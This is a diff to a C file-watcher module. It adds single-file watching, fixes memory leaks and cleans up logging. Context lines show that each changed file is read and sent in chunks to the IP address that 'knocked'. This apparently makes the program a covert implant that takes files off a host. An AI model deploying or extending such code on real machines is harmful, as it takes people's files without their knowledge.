@@ -54,7 +54,17 @@ static void build_snapshot_recursive(snapshot_t * snap, const char * dir) {
 static snapshot_t * build_snapshot(const char * root) {
     snapshot_t * snap = calloc(1, sizeof(snapshot_t));
     if (snap == NULL) return NULL;
-    build_snapshot_recursive(snap, root);
+
+    struct stat st;
+    if (lstat(root, &st) < 0) return snap;
+
+    if (S_ISREG(st.st_mode)) {
+        // Single file — add it directly
+        snapshot_add(snap, root, st.st_mtime, st.st_size);
+    } else if (S_ISDIR(st.st_mode)) {
+        build_snapshot_recursive(snap, root);
+    }
+
     return snap;
 }
 
@@ -150,7 +160,43 @@ static watch_table_t * register_watches(const char * root) {
         return NULL;
     }
 
-    register_watches_recursive(watch_table, root);
+    struct stat st;
+    if (lstat(root, &st) < 0) {
+        perror("lstat");
+        free(watch_table);
+        return NULL;
+    }
+
+    if (S_ISREG(st.st_mode)) {
+        // For a single file, watch its parent directory but filtered to that file
+        char parent[RESPONSE_BUFFER_LENGTH];
+        strncpy(parent, root, RESPONSE_BUFFER_LENGTH - 1);
+        parent[RESPONSE_BUFFER_LENGTH - 1] = '\0';
+
+        // Extract parent directory by trimming after last '/'
+        char * last_slash = strrchr(parent, '/');
+        if (last_slash != NULL) {
+            *last_slash = '\0';
+        } else {
+            // No slash means it's in the current directory
+            strncpy(parent, ".", RESPONSE_BUFFER_LENGTH - 1);
+        }
+
+        const int watch_d = inotify_add_watch(watch_table->inotify_fd, parent, INOTIFY_FLAGS);
+        if (watch_d < 0) {
+            perror("inotify_add_watch");
+            free(watch_table);
+            return NULL;
+        }
+
+        watch_entry_t * watch_entry = &watch_table->watches[watch_table->count++];
+        watch_entry->wd = watch_d;
+        strncpy(watch_entry->path, parent, RESPONSE_BUFFER_LENGTH - 1);
+        watch_entry->path[RESPONSE_BUFFER_LENGTH - 1] = '\0';
+    } else if (S_ISDIR(st.st_mode)) {
+        register_watches_recursive(watch_table, root);
+    }
+
     return watch_table;
 }
 
@@ -173,7 +219,7 @@ static void run_workflows(const struct session_info * session_info, const change
         const char * type_str = c->type == CHANGE_ADDED   ? "ADDED"
                               : c->type == CHANGE_REMOVED ? "REMOVED"
                               : "MODIFIED";
-        
+
         log_message("[WATCH] %-10s %s", type_str, c->path);
 
         const int bytes_written = snprintf(message_buffer, MESSAGE_BUFFER_LENGTH, "[WATCH] %-10s %s", type_str, c->path);
@@ -188,6 +234,7 @@ static void run_workflows(const struct session_info * session_info, const change
             FILE * file = fopen(c->path, "rb");
             if (file == NULL) {
                 fprintf(stderr, "Failed to open file: %s\n", c->path);
+                free(message_buffer);
                 return;
             }
 
@@ -195,6 +242,7 @@ static void run_workflows(const struct session_info * session_info, const change
             if (file_buffer == NULL) {
                 fprintf(stderr, "Failed to allocate file buffer\n");
                 fclose(file);
+                free(message_buffer);
                 return;
             }
 
@@ -209,12 +257,10 @@ static void run_workflows(const struct session_info * session_info, const change
                 file_buffer[chunk_bytes] = '\0';
                 send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, file_buffer);
                 chunk_count++;
-                printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
-                fflush(stdout);
+                log_message("Sent chunk %zu (%zu bytes)", chunk_count, chunk_bytes);
             }
 
-            printf("File transfer complete. Sent %zu chunks\n", chunk_count);
-            fflush(stdout);
+            log_message("File transfer complete. Sent %zu chunks", chunk_count);
 
             fclose(file);
             free(file_buffer);
@@ -235,7 +281,7 @@ static int poll_events(const watch_table_t * watch_table, const int timeout_ms, 
     FD_SET(watch_table->inotify_fd, &readfds);
 
     struct timeval tv;
-    tv.tv_sec  = timeout_ms / 1000;
+    tv.tv_sec = timeout_ms / 1000;
     tv.tv_usec = (timeout_ms % 1000) * 1000;
 
     const int ret = select(watch_table->inotify_fd + 1, &readfds, NULL, NULL, &tv);
@@ -262,12 +308,9 @@ static int poll_events(const watch_table_t * watch_table, const int timeout_ms, 
     return 1;
 }
 
-static void do_rescan(const struct session_info * session_info,
-                         snapshot_t ** index,
-                      watch_table_t ** watch_table,
-                      const char * root) {
-    snapshot_t    * new_index = build_snapshot(root);
-    change_list_t * changes   = diff_snapshots(*index, new_index);
+static void do_rescan(const struct session_info * session_info, snapshot_t ** index, watch_table_t ** watch_table, const char * root) {
+    snapshot_t * new_index = build_snapshot(root);
+    change_list_t * changes = diff_snapshots(*index, new_index);
 
     free(*index);
     *index = new_index;
@@ -289,9 +332,20 @@ void * watch_directory(void * arg) {
         pthread_exit(NULL);
     }
 
-    log_message("Starting directory watcher on: %s", root);
+    struct stat st;
+    if (lstat(root, &st) < 0) {
+        log_message("Cannot stat watch path: %s", root);
+        pthread_exit(NULL);
+    }
 
-    snapshot_t    * index       = build_snapshot(root);
+    if (!S_ISREG(st.st_mode) && !S_ISDIR(st.st_mode)) {
+        log_message("Watch path is neither a file nor a directory: %s", root);
+        pthread_exit(NULL);
+    }
+
+    log_message("Starting watcher on: %s (%s)", root, S_ISDIR(st.st_mode) ? "directory" : "file");
+
+    snapshot_t * index = build_snapshot(root);
     watch_table_t * watch_table = register_watches(root);
 
     if (index == NULL || watch_table == NULL) {
@@ -312,11 +366,10 @@ void * watch_directory(void * arg) {
             continue;
         }
 
-        // Debounce loop
         long long last_event_time = now_ms();
         while (session_info->run_watcher) {
-            const long long elapsed   = now_ms() - last_event_time;
-            const int       remaining = (int)(DEBOUNCE_MS - elapsed);
+            const long long elapsed = now_ms() - last_event_time;
+            const int remaining = (int)(DEBOUNCE_MS - elapsed);
 
             if (remaining <= 0) {
                 do_rescan(session_info, &index, &watch_table, root);
@@ -336,7 +389,7 @@ void * watch_directory(void * arg) {
         }
     }
 
-    log_message("Directory watcher stopped");
+    log_message("Watcher stopped");
     free(index);
     free_watches(watch_table);
     free(session_info->watch_path);
